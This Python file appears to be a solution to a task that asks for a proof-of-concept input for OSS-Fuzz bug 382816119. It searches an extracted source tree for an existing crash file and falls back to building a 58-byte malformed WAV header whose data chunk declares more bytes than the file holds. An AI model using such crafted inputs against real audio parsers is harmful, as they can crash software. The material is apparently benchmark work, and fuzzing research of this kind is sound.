import os
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root_dir = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="pocgen_")
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(tmpdir)
                root_dir = tmpdir

            poc = self._find_poc(root_dir)
            if poc is not None:
                return poc
            return self._fallback_poc()
        finally:
            if tmpdir is not None:
                shutil.rmtree(tmpdir, ignore_errors=True)

    def _find_poc(self, root_dir: str):
        target_len = 58

        # Step 1: files with the specific OSS-Fuzz bug id in the path
        bug_id = "382816119"
        best = None  # (diff, size, path)
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                full = os.path.join(dirpath, filename)
                lower = full.lower()
                if bug_id in lower:
                    try:
                        size = os.path.getsize(full)
                    except OSError:
                        continue
                    diff = abs(size - target_len)
                    if best is None or diff < best[0] or (diff == best[0] and size < best[1]):
                        best = (diff, size, full)
        if best is not None:
            try:
                with open(best[2], "rb") as f:
                    return f.read()
            except OSError:
                pass

        # Step 2: generic oss-fuzz style files, prefer RIFF and size close to target
        keywords = ("oss-fuzz", "ossfuzz", "clusterfuzz", "poc", "crash")
        best2 = None  # (diff, riff_flag, size, path)
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                full = os.path.join(dirpath, filename)
                lower = full.lower()
                if not any(k in lower for k in keywords):
                    continue
                try:
                    size = os.path.getsize(full)
                except OSError:
                    continue
                if size == 0 or size > 1000000:
                    continue
                try:
                    with open(full, "rb") as f:
                        head = f.read(4)
                except OSError:
                    continue
                riff_flag = 0 if head == b"RIFF" else 1
                diff = abs(size - target_len)
                key = (diff, riff_flag, size)
                if best2 is None or key < best2[:3]:
                    best2 = (diff, riff_flag, size, full)
        if best2 is not None:
            try:
                with open(best2[3], "rb") as f:
                    return f.read()
            except OSError:
                pass

        # Step 3: small RIFF files in typical test/corpus directories
        best3 = None  # (diff, size, path)
        test_indicators = (
            "test",
            "tests",
            "fuzz",
            "regress",
            "ossfuzz",
            "oss-fuzz",
            "corpus",
            "input",
            "inputs",
            "cases",
            "example",
            "examples",
        )
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                full = os.path.join(dirpath, filename)
                lower = full.lower()
                if not any(t in lower for t in test_indicators):
                    continue
                try:
                    size = os.path.getsize(full)
                except OSError:
                    continue
                if size == 0 or size > 4096:
                    continue
                try:
                    with open(full, "rb") as f:
                        head = f.read(4)
                except OSError:
                    continue
                if head != b"RIFF":
                    continue
                diff = abs(size - target_len)
                if best3 is None or diff < best3[0] or (diff == best3[0] and size < best3[1]):
                    best3 = (diff, size, full)
        if best3 is not None:
            try:
                with open(best3[2], "rb") as f:
                    return f.read()
            except OSError:
                pass

        return None

    def _fallback_poc(self) -> bytes:
        # Generic malformed RIFF/WAV-like header with inconsistent sizes (58 bytes)
        total_size = 58
        riff_chunk_size = total_size - 8  # RIFF chunk size field

        data = bytearray(total_size)
        # RIFF header
        data[0:4] = b"RIFF"
        data[4:8] = riff_chunk_size.to_bytes(4, "little")
        data[8:12] = b"WAVE"

        # fmt chunk
        data[12:16] = b"fmt "
        data[16:20] = (16).to_bytes(4, "little")  # PCM fmt chunk size
        data[20:22] = (1).to_bytes(2, "little")   # PCM
        data[22:24] = (1).to_bytes(2, "little")   # mono
        sample_rate = 8000
        data[24:28] = sample_rate.to_bytes(4, "little")
        byte_rate = sample_rate * 1 * 16 // 8
        data[28:32] = byte_rate.to_bytes(4, "little")
        block_align = 1 * 16 // 8
        data[32:34] = block_align.to_bytes(2, "little")
        data[34:36] = (16).to_bytes(2, "little")  # bits per sample

        # data chunk with declared size larger than actual payload
        data[36:40] = b"data"
        declared_data_size = 64  # larger than the remaining 14 bytes
        data[40:44] = declared_data_size.to_bytes(4, "little")

        # Remaining bytes are zero-initialized
        return bytes(data)